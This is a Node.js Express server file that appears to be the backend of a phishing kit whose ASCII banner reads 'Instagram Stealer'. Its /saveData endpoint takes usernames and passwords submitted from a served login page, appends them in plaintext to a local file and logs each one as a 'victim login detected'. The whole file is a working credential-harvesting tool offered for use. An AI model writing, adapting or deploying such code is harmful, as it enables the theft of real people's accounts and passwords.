// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to save data
app.post('/saveData', (req, res) => {
    const { username, password } = req.body;
    const date = new Date();
    const timestamp = `${date.toDateString()} | ${date.toLocaleTimeString()}`;
    const data = `${timestamp} | Username: ${username} - Password: ${password}\n`;

    fs.appendFile(path.join(__dirname, 'data.txt'), data, (err) => {
        if (err) {
            console.error(err);
            return res.status(500).json({ message: 'Error saving data' });
        }
        console.log(`${timestamp} | Victim login detected | Data Saved Successfully`)
        res.json({ message: 'Data saved successfully' });
    });
});

app.listen(PORT, () => {
    console.log(` ▄█  ███▄▄▄▄      ▄████████     ███        ▄████████    ▄██████▄     ▄████████    ▄████████   ▄▄▄▄███▄▄▄▄            
███  ███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███   ███    ███   ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄          
███▌ ███   ███   ███    █▀     ▀███▀▀██   ███    ███   ███    █▀    ███    ███   ███    ███ ███   ███   ███          
███▌ ███   ███   ███            ███   ▀   ███    ███  ▄███         ▄███▄▄▄▄██▀   ███    ███ ███   ███   ███          
███▌ ███   ███ ▀███████████     ███     ▀███████████ ▀▀███ ████▄  ▀▀███▀▀▀▀▀   ▀███████████ ███   ███   ███          
███  ███   ███          ███     ███       ███    ███   ███    ███ ▀███████████   ███    ███ ███   ███   ███          
███  ███   ███    ▄█    ███     ███       ███    ███   ███    ███   ███    ███   ███    ███ ███   ███   ███          
█▀    ▀█   █▀   ▄████████▀     ▄████▀     ███    █▀    ████████▀    ███    ███   ███    █▀   ▀█   ███   █▀           
                                                                    ███    ███                                       
   ▄████████     ███        ▄████████    ▄████████  ▄█          ▄████████    ▄████████                               
  ███    ███ ▀█████████▄   ███    ███   ███    ███ ███         ███    ███   ███    ███                               
  ███    █▀     ▀███▀▀██   ███    █▀    ███    ███ ███         ███    █▀    ███    ███                               
  ███            ███   ▀  ▄███▄▄▄       ███    ███ ███        ▄███▄▄▄      ▄███▄▄▄▄██▀                               
▀███████████     ███     ▀▀███▀▀▀     ▀███████████ ███       ▀▀███▀▀▀     ▀▀███▀▀▀▀▀                                 
         ███     ███       ███    █▄    ███    ███ ███         ███    █▄  ▀███████████                               
   ▄█    ███     ███       ███    ███   ███    ███ ███▌    ▄   ███    ███   ███    ███                               
 ▄████████▀     ▄████▀     ██████████   ███    █▀  █████▄▄██   ██████████   ███    ███                               
                                                   ▀                        ███    ███                               `)
    console.log(`Server is running on http://localhost:${PORT}\n`);
});
